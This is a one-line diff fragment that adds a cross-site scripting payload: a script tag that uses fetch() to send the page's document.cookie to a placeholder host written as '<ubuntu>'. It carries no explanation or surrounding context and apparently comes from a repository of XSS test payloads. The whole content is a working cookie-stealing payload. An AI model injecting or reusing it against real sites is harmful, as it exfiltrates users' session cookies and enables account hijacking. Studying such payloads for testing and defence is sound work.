@@ -1,0 +1,1 @@
+<script>fetch('http://<ubuntu>/'+document.cookie)</script>
